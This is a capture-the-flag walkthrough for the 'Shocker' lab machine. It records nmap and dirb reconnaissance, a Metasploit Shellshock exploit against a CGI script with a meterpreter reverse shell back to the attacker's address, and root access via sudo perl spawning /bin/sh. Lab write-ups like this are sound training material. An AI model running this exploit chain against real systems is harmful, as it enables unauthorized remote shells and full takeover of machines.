<h1>Shocker 10.10.10.56</h1>

  nmap -sS -sV -Pn -A -v 10.10.10.56 -oX shocker.xml

  nmap -sC -Pn -A -v 10.10.10.56 -oX shocker1.xml

  nmap -Pn -p- -vv 10.10.10.56 -oX shocker2.xml

  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  | vulners:
  |   cpe:/a:apache:http_server:2.4.18:
  | 	CVE-2017-7679		7.5		https://vulners.com/cve/CVE-2017-7679
  | 	CVE-2017-3167		7.5		https://vulners.com/cve/CVE-2017-3167
  | 	CVE-2017-3169		7.5		https://vulners.com/cve/CVE-2017-3169
  | 	CVE-2017-7668		7.5		https://vulners.com/cve/CVE-2017-7668
  | 	CVE-2017-9788		6.4		https://vulners.com/cve/CVE-2017-9788
  | 	CVE-2016-8743		5.0		https://vulners.com/cve/CVE-2016-8743
  | 	CVE-2017-9798		5.0		https://vulners.com/cve/CVE-2017-9798
  | 	CVE-2016-4979		5.0		https://vulners.com/cve/CVE-2016-4979
  | 	CVE-2016-8740		5.0		https://vulners.com/cve/CVE-2016-8740
  |_	CVE-2016-1546		4.3		https://vulners.com/cve/CVE-2016-1546
  2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
  | vulners:
  |   cpe:/a:openbsd:openssh:7.2p2:
  | 	CVE-2016-6515		7.8		https://vulners.com/cve/CVE-2016-6515
  | 	CVE-2016-8858		7.8		https://vulners.com/cve/CVE-2016-8858
  | 	CVE-2015-8325		7.2		https://vulners.com/cve/CVE-2015-8325
  | 	CVE-2017-15906		5.0		https://vulners.com/cve/CVE-2017-15906
  |_	CVE-2016-6210		4.3		https://vulners.com/cve/CVE-2016-6210
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


<h2>Hosts</h2>

  address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
  -------      ---  ----  -------  ---------  -----  -------  ----  --------
  10.10.10.56             Linux               3.X    server

<h2>Services</h2>

  host         port  proto  name  state  info
  ----         ----  -----  ----  -----  ----
  10.10.10.56  80    tcp    http  open   Apache httpd 2.4.18 (Ubuntu)
  10.10.10.56  2222  tcp    ssh   open   OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 Ubuntu Linux; protocol 2.0


Notworking >> wfuzz -w /usr/share/wordlists/dirb/small.txt --hc 404,400 10.10.10.56/cgi-bin/FUZZ.sh

<h2>Dirb</h2>
  dirb http://10.10.10.56 /usr/share/wordlists/dirb/big.txt -X .sh

  dirb http://10.10.10.56/cgi-bin -X .sh
    ---- Scanning URL: http://10.10.10.56/cgi-bin/ ----
    + http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)

<h2>Metasploit</h2>
  msf exploit(apache_mod_cgi_bash_env_exec) > show options

  Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

     Name            Current Setting   Required  Description
     ----            ---------------   --------  -----------
     CMD_MAX_LENGTH  2048              yes       CMD max line length
     CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
     HEADER          User-Agent        yes       HTTP header to use
     METHOD          GET               yes       HTTP method to use
     Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOST           10.10.10.56       yes       The target address
     RPATH           /bin              yes       Target PATH for binaries used by the CmdStager
     RPORT           80                yes       The target port (TCP)
     SRVHOST         0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
     SRVPORT         8080              yes       The local port to listen on.
     SSL             false             no        Negotiate SSL/TLS for outgoing connections
     SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
     TARGETURI       /cgi-bin/user.sh  yes       Path to CGI script
     TIMEOUT         5                 yes       HTTP read response timeout (seconds)
     URIPATH                           no        The URI to use for this exploit (default is random)
     VHOST                             no        HTTP server virtual host


  Payload options (linux/x86/meterpreter/reverse_tcp):

     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  10.10.14.105     yes       The listen address
     LPORT  4447             yes       The listen port


  Exploit target:

     Id  Name
     --  ----
     0   Linux x86

<h2>User</h2>
  meterpreter > ls
  Listing: /home/shelly
  =====================

  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  100600/rw-------  0     fil   2017-09-25 14:29:38 +0200  .bash_history
  100644/rw-r--r--  220   fil   2017-09-22 18:33:54 +0200  .bash_logout
  100644/rw-r--r--  3771  fil   2017-09-22 18:33:54 +0200  .bashrc
  40700/rwx------   4096  dir   2017-09-22 18:35:28 +0200  .cache
  40775/rwxrwxr-x   4096  dir   2017-09-22 21:49:12 +0200  .nano
  100644/rw-r--r--  655   fil   2017-09-22 18:33:54 +0200  .profile
  100644/rw-r--r--  66    fil   2017-09-22 21:43:04 +0200  .selected_editor
  100644/rw-r--r--  0     fil   2017-09-22 18:35:31 +0200  .sudo_as_admin_successful
  100444/r--r--r--  33    fil   2017-09-22 21:37:05 +0200  user.txt

  meterpreter > cat user.txt
  xxx CENSORED xxx

<h2>Root</h2>
  shell
  SHELL=/bin/bash script -q /dev/nullme
  or
  python3 -c 'import pty; pty.spawn("/bin/bash")'

  shelly@Shocker:/tmp$ sudo --version
    sudo --version
    Sudo version 1.8.16
    Sudoers policy plugin version 1.8.16
    Sudoers file grammar version 45
    Sudoers I/O plugin version 1.8.16

  sudo perl -e 'exec "/bin/sh";'
    # whoami
    whoami
    root
    # cat /root/root.txt
    cat /root/root.txt
    xxx CENSORED xxx
